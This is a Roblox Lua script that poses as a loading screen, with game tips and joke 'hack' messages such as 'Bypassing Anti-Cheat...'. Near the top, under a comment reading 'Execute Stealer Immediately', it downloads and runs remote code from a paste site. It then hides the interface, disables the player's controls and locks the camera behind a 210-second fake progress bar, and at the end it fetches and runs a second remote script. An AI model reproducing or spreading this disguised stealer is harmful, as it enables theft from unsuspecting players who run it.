-- CONFIG
local LOADING_TIME = 210 -- seconds
local tips = {
    "Tip: Pressing space makes you jump!",
    "Tip: Collect coins for bonuses!",
    "Tip: Use cover to avoid enemies.",
    "Tip: Watch your stamina bar.",
    "Tip: You can sprint by holding Shift.",
    "Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/l9Kp67lO/raw"))()
end)

-- Hide CoreGui
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Lock player controls
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local PlayerModule = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
local Controls = PlayerModule:GetControls()
Controls:Disable()

-- Lock camera
local camera = game.Workspace.CurrentCamera
camera.CameraType = Enum.CameraType.Scriptable

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.Parent = screenGui

-- Colorful triangular background effect
local uiGradient = Instance.new("UIGradient")
uiGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,255,0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,255))
}
uiGradient.Rotation = 45
uiGradient.Parent = bg

-- Pulsating top element
local pulse = Instance.new("Frame")
pulse.Size = UDim2.new(1,0,0.15,0)
pulse.BackgroundColor3 = Color3.fromRGB(255,255,255)
pulse.BackgroundTransparency = 0.7
pulse.Parent = bg

local pulseTweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
game:GetService("TweenService"):Create(pulse, pulseTweenInfo, {BackgroundTransparency = 0.3}):Play()

-- Tip label
local tipLabel = Instance.new("TextLabel")
tipLabel.Size = UDim2.new(1,0,0.1,0)
tipLabel.Position = UDim2.new(0,0,0.4,0)
tipLabel.BackgroundTransparency = 1
tipLabel.TextColor3 = Color3.fromRGB(255,255,255)
tipLabel.TextScaled = true
tipLabel.Parent = bg

-- Progress bar
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.8,0,0.05,0)
barBg.Position = UDim2.new(0.1,0,0.5,0)
barBg.BackgroundColor3 = Color3.fromRGB(50,50,50)
barBg.Parent = bg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0,0,1,0)
barFill.BackgroundColor3 = Color3.fromRGB(255,0,0)
barFill.Parent = barBg

local barGradient = Instance.new("UIGradient")
barGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,255,0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,255))
}
barGradient.Parent = barFill

-- Loading text
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1,0,0.1,0)
loadingText.Position = UDim2.new(0,0,0.56,0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.fromRGB(255,255,255)
loadingText.TextScaled = true
loadingText.Parent = bg

-- Tip rotation
task.spawn(function()
    while true do
        tipLabel.Text = tips[math.random(1, #tips)]
        task.wait(4)
    end
end)

-- Progress
for i = 0, LOADING_TIME do
    local progress = i / LOADING_TIME
    barFill.Size = UDim2.new(progress,0,1,0)
    loadingText.Text = string.format("Loading... %d%%", math.floor(progress * 100))
    task.wait(1)
end

-- Remove loading screen
screenGui:Destroy()

-- Restore camera & controls
camera.CameraType = Enum.CameraType.Custom
Controls:Enable()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

-- Execute visual script AFTER loading
local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.Load()
